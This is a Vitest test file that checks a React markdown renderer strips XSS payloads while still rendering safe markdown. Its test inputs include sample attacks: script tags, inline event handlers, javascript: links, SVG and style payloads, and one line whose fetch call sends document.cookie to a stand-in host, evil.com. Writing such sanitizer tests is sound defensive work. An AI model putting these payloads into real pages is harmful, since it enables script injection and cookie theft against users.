// ABOUTME: Tests for markdown rendering XSS protection
// ABOUTME: Validates that malicious HTML/JavaScript is properly sanitized

import React from 'react';
import { describe, it, expect } from 'vitest';
import { render } from '@testing-library/react';
import { MarkdownRenderer } from './MarkdownRenderer';

describe('Markdown XSS Protection', () => {
  const renderMarkdown = (content: string) => {
    return render(
      <MarkdownRenderer content={content} />
    );
  };

  describe('Script injection protection', () => {
    it('should strip script tags from markdown', () => {
      const maliciousContent = `
# Test PRD
<script>alert('XSS')</script>
Normal content here
      `;

      const { container } = renderMarkdown(maliciousContent);

      // Script tag should be stripped
      expect(container.querySelector('script')).toBeNull();
      expect(container.innerHTML).not.toContain('alert');

      // Normal content should still render
      expect(container.textContent).toContain('Test PRD');
      expect(container.textContent).toContain('Normal content here');
    });

    it('should strip inline script handlers', () => {
      const maliciousContent = `
# Test
<img src="x" onerror="alert('XSS')">
<a href="#" onclick="alert('XSS')">Click me</a>
      `;

      const { container } = renderMarkdown(maliciousContent);

      // onerror and onclick handlers should be stripped
      expect(container.innerHTML).not.toContain('onerror');
      expect(container.innerHTML).not.toContain('onclick');
      expect(container.innerHTML).not.toContain('alert');
    });

    it('should strip javascript: protocol in links', () => {
      const maliciousContent = `
[Click me](javascript:alert('XSS'))
<a href="javascript:void(0)">Test</a>
      `;

      const { container } = renderMarkdown(maliciousContent);

      // javascript: protocol should be stripped
      expect(container.innerHTML).not.toContain('javascript:');
    });
  });

  describe('Data exfiltration protection', () => {
    it('should strip event handlers that could steal data', () => {
      const maliciousContent = `
<img src=x onload="fetch('https://evil.com?cookie='+document.cookie)">
<input type="text" onfocus="stealData()">
      `;

      const { container } = renderMarkdown(maliciousContent);

      // Event handlers should be stripped
      expect(container.innerHTML).not.toContain('onload');
      expect(container.innerHTML).not.toContain('onfocus');
      expect(container.innerHTML).not.toContain('fetch');
      expect(container.innerHTML).not.toContain('stealData');
    });

    it('should strip iframe tags', () => {
      const maliciousContent = `
# Test
<iframe src="https://evil.com"></iframe>
      `;

      const { container } = renderMarkdown(maliciousContent);

      // iframe should be stripped
      expect(container.querySelector('iframe')).toBeNull();
    });

    it('should strip object and embed tags', () => {
      const maliciousContent = `
<object data="https://evil.com"></object>
<embed src="https://evil.com"></embed>
      `;

      const { container } = renderMarkdown(maliciousContent);

      // object and embed should be stripped
      expect(container.querySelector('object')).toBeNull();
      expect(container.querySelector('embed')).toBeNull();
    });
  });

  describe('Safe HTML support', () => {
    it('should render safe markdown elements', () => {
      const safeContent = `
# Test Heading

**Bold text** and *italic text*

- List item 1
- List item 2
      `;

      const { container } = renderMarkdown(safeContent);

      // Markdown elements should render properly
      expect(container.querySelector('h1')).toBeTruthy();
      expect(container.querySelector('strong')).toBeTruthy();
      expect(container.querySelector('em')).toBeTruthy();
      expect(container.querySelector('ul')).toBeTruthy();
      expect(container.querySelector('li')).toBeTruthy();
    });

    it('should allow safe markdown syntax', () => {
      const safeMarkdown = `
# Heading 1
## Heading 2

**Bold** and *italic* text

- List item 1
- List item 2

\`\`\`javascript
const code = "example";
\`\`\`

[Safe link](https://example.com)
      `;

      const { container } = renderMarkdown(safeMarkdown);

      // Markdown should render properly
      expect(container.querySelector('h1')).toBeTruthy();
      expect(container.querySelector('h2')).toBeTruthy();
      expect(container.querySelector('strong')).toBeTruthy();
      expect(container.querySelector('em')).toBeTruthy();
      expect(container.querySelector('ul')).toBeTruthy();
      expect(container.querySelector('a')).toBeTruthy();
    });
  });

  describe('Complex XSS attempts', () => {
    it('should handle encoded script tags', () => {
      const maliciousContent = `
&lt;script&gt;alert('XSS')&lt;/script&gt;
      `;

      const { container } = renderMarkdown(maliciousContent);

      // Encoded scripts should not execute
      expect(container.querySelector('script')).toBeNull();
    });

    it('should handle SVG-based XSS', () => {
      const maliciousContent = `
<svg onload="alert('XSS')">
  <circle cx="50" cy="50" r="40"/>
</svg>
      `;

      const { container } = renderMarkdown(maliciousContent);

      // SVG event handlers should be stripped
      expect(container.innerHTML).not.toContain('onload');
      expect(container.innerHTML).not.toContain('alert');
    });

    it('should handle style-based XSS', () => {
      const maliciousContent = `
<div style="background: url('javascript:alert(1)')">Test</div>
<style>body { background: url('javascript:alert(1)'); }</style>
      `;

      const { container } = renderMarkdown(maliciousContent);

      // javascript: in styles should be stripped
      expect(container.innerHTML).not.toContain('javascript:');
      // style tags should be stripped
      expect(container.querySelector('style')).toBeNull();
    });
  });
});
